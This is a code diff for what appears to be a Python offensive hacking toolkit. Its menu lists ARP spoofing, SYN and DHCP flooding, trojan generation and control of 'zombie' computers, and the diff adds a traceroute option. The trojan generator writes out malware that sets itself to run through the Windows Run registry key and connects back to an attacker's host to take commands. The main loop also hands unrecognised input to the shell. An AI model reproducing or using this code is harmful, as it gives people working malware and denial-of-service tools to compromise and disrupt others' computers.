@@ -23,6 +23,11 @@ except:
 import random, sys, uuid, os#导入需要的自带模块
 import socket as sk
 
+argv = sys.argv
+for i in argv:
+    if i == "-G":
+        import GUI
+
 print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
 print("必须以UTF-8编码运行程序")
 print("所有模块都可以按ctrl + c 退出")#为什么还有人不知道ctrl + c的神奇组合
@@ -46,7 +51,7 @@ print("|__/ |__/ |__/ \_______/|__/      |__/  \__/ \______/|______/ \______/ |_
 print("+-------------------------------------+------------------------+")
 print("|  MEN                                |  STR                   |")
 print("+-------------------------------------+------------------------+")
-print("|   0x000189abaa                      |         MOV 267 ACC    |")
+print("|   0x000189abaa                      |         MOV 341 ACC    |")
 print("|   0x000189abab                      |         PYTHON         |")
 print("+-------------------------------------+------------------------+")
 print("|             github:www.github.com/marko1616                  |")
@@ -54,7 +59,7 @@ print("+--------------------------------------------------------------+")
 print("|          bilibili:space.bilibili.com/385353604               |")
 print("+--------------------------------------------------------------+")
 
-print("loding plugins...")
+print("loding plugins...")#TODO init
 
 plugins_list = []
 plugins_dir = os.path.join(os.getcwd() + '/plugins')
@@ -77,6 +82,8 @@ for i in file:
 file.close()
 
 print("password list read...Done")
+
+user_list = ["root"]
 
 def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
     
@@ -215,7 +222,7 @@ def Generate_trojan_virus():
     lport = input("Enter connect port:")
     file = open("virus/" + name + ".py",'w')
     file.write('import socket, os, time\n')
-    file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')
+    file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')#你好你的注册表被xx了
     file.write('s = socket.socket()\n')
     file.write('s.connect(("' + lhost + '",' + lport + '))\n')
     file.write('while True:\n')
@@ -242,13 +249,17 @@ def countrol_zombie_computer():
         data = conn.recv(4096)
         print(data.decode("utf-8"))
 
-def Brute_force_mysql_password():
-    pass
+def trace_router():
+    dport = []
+    target = input("Enter the target IP or domain:")
+    dport.append(int(input("Enter the connect port:")))
+    res, unans = traceroute(target, dport=dport, retry=-2)
+    time.sleep(1)
 
 print("Setup in ", time.time() - tick, "seconds.")#初始化计时
 while True:#喜闻乐见的主循环
     os_command = False
-    tool_number = 12
+    tool_number = 13
 
     print("如果要选择插件请输入插件名字")
     print("quit(0)")#告诉用户对应的功能
@@ -263,6 +274,7 @@ while True:#喜闻乐见的主循环
     print("DHCP flood(9)")
     print("Generate trojan virus(10)")
     print("Control zombie computer(11)")
+    print("Trace router(12)")
     print("退出(0)")
     print("ARP欺骗带ARPPing(内网用)。(1)")
     print("SYN洪水(2)")
@@ -275,17 +287,17 @@ while True:#喜闻乐见的主循环
     print("DHCP洪水(9)")
     print("生成木马病毒(10)")
     print("控制肉鸡(11)")
+    print("路由跟踪(12)")
     print("------------------pulgins-------------------")
     for i in plugins_list:
         print(i + "(" + str(tool_number) + ")")
-        tool_number = tool_number + 1
+        tool_number = tool_number + 17
 
     choose = input(">>>")#用户选择输入
-
-    try:#判断用户输入的是否是数字
-        choose = int(choose)#用int函数强转数字
-    except:#如果不是就告诉用户必须输入数字
-        print("Must enter int")
+    try:#如果是数字输入就转为int类
+        choose = int(choose)
+    except:
+        pass
 
     if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
         sys.exit(0)
@@ -311,6 +323,8 @@ while True:#喜闻乐见的主循环
         Generate_trojan_virus()
     elif choose == 11:
         countrol_zombie_computer()
+    elif choose == 12:
+         trace_router()
     else:
         os_command = True
 
@@ -319,6 +333,6 @@ while True:#喜闻乐见的主循环
             exec(i + ".run()")
             os_command = False
 
-    if os_command:
-        os.system(choose)
+    if os_command:#如果不是选项就当作系统命令
+        os.system(str(choose))
         time.sleep(2)
